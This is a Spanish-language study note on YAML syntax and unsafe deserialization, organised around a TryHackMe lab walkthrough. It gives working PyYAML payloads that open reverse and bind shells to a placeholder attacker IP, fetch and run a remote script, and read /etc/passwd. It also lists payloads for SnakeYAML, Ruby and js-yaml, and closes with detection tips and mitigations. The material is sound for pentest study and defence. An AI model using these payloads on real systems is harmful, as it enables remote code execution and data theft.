---
title: YAML
tags:
  - tecnologia
  - vulnerabilidad
aliases:
  - YML
  - Inyección YAML
  - Deserialización YAML
---

YAML (*YAML Ain't Markup Language*) es un formato de **serialización de datos** en texto plano, legible por humanos. Se usa muchísimo para configuraciones (`docker-compose.yml`, Kubernetes, CI/CD, Ansible) y para **transportar objetos** entre sistemas (APIs, pipelines, herramientas de datos).

Su peligro en seguridad viene de un detalle: **YAML no solo describe datos, también puede describir objetos y ejecución de código**, dependiendo del parser que use la aplicación.

---

## Sintaxis básica

```yaml
# Clave: valor
nombre: Beach Bar
puerto: 8080
activo: true

# Listas
tags:
  - yaml
  - rce

# Listas inline
tags: [yaml, rce]

# Diccionario anidado
servidor:
  host: 10.10.10.10
  usuario: admin
```

Reglas importantes:

- La indentación define la jerarquía (espacios, **nunca tabs**).
- `---` separa documentos dentro de un mismo archivo.
- `#` es comentario.
- Los tipos son inferidos: `123` es número, `true` es booleano, el resto string.

---

## El problema: `load` vs `safe_load`

En **Python (PyYAML)** existen dos formas de parsear:

```python
import yaml

yaml.safe_load(datos)   # SOLO tipos primitivos: str, int, list, dict  -> SEGURO
yaml.load(datos)        # permite tags arbitrarios -> EJECUCIÓN DE CÓDIGO
yaml.unsafe_load(datos) # idéntico a load(), explícitamente inseguro
```

El parser inseguro acepta **tags** que instancian clases de Python y ejecutan funciones. Eso convierte cualquier campo YAML controlado por el usuario en una **[[RCE]]**.

---

## Tags maliciosos (el vector de ataque)

| Tag | Qué hace |
| :--- | :--- |
| `!!python/object/apply:<func>` | Llama a una función con argumentos (el más usado) |
| `!!python/object/new:<class>` | Crea una instancia de una clase |
| `!!python/name:<modulo.func>` | Referencia directa a un objeto de Python |
| `!!python/module:<mod>` | Importa un módulo completo |
| `!!python/object/apply:os.system` | Ejecución directa de comandos del SO |

---

## Explotación: [[Reverse Shell]] desde YAML

Esta es la técnica usada en la máquina **[[Beach Bar]]** (TryHackMe): el panel tenía un campo donde pegar YAML que el backend parseaba con un loader inseguro.

### 1. Escuchar en tu máquina

```bash
nc -lvnp 4444
```

### 2. Payload que devuelve la reverse shell

```yaml
!!python/object/apply:subprocess.check_output [["bash","-c","bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1"]]
```

Variante con `os.system`:

```yaml
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1'"]
```

Variante con Python (si no hay `bash`):

```yaml
!!python/object/apply:os.system ["python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP_ATACANTE\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run([\"/bin/sh\",\"-i\"])'"]
```

> [!NOTE]
> El formato es `!!python/object/apply:comando [["arg1","arg2"]]`. La lista externa son los argumentos y la interna es la lista de argumentos del programa.

### 3. Variantes según lo que quieras lograr

```yaml
# Leer archivo (exfiltra por DNS/HTTP o lo devuelve en la respuesta)
!!python/object/apply:open ["/etc/passwd", "r"]

# Descargar un script y ejecutarlo
!!python/object/apply:os.system ["curl http://IP/shell.sh | bash"]

# Bind shell en el puerto 5555
!!python/object/apply:os.system ["nc -e /bin/sh 0.0.0.0 5555"]

#whoami / comandos rápidos si la respuesta se refleja en la web
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]
```

---

## Detección

Señales de que el target parsea YAML:

- Campos o formularios con texto multilínea donde "pegar configuración".
- Endpoints que reciben `Content-Type: application/yaml` o `application/x-yaml`.
- Archivos visibles: `.yml`, `.yaml`, `docker-compose.yml`, `config.yaml`.
- Errores del parser en la respuesta: `yaml.constructor.ConstructorError`, `could not determine a constructor for tag`, `ScannerError`, `ComposerError`.

Prueba rápida de inyección:

```yaml
!!python/object/apply:os.system ["id"]
```

Si aparece la salida de `id` (o un error distinto de "tag no soportado"), hay inseguridad. Un `safe_load` responde con `ConstructorError: could not determine a constructor for the tag '!!python/object/apply'`.

Detección con [[FFUF]] buscando archivos de configuración:

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://IP/FUZZ -mc 200 -e .yml,.yaml
```

---

## Otros lenguajes / parsers afectados

| Ecosistema | Parser inseguro | Payload de ejemplo |
| :--- | :--- | :--- |
| **Python** | `yaml.load()` (PyYAML) | `!!python/object/apply:os.system ["id"]` |
| **Java** | SnakeYAML `new Yaml().load()` | `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://IP/exploit.class"]]]]` |
| **Ruby** | `YAML.load` (Psych) | `--- !ruby/object:Gem::Installer` |
| **PHP** | `yaml_parse()` con objetos | Depende de la extensión |
| **Go** | `ghodss/yaml` vía JSON | Más limitado, casi siempre seguro |
| **Node.js** | `js-yaml` < 4 con `load()` | `!!js/function > function(){...}` |

---

## Mitigaciones

- **Nunca** usar `yaml.load()` / `yaml.unsafe_load()` con datos externos → siempre `yaml.safe_load()`.
- En Java: usar `new Yaml(new SafeConstructor())` o SnakeYAML 2.0+ (por defecto restringe tipos).
- Validar/esquematizar el YAML (JSON Schema / whitelist de claves) antes de parsearlo.
- Aislar el proceso que parsea YAML (contenedor, usuario sin privilegios, sin red).
- No pasar YAML de usuario directamente a `eval`, templates o shells.

---
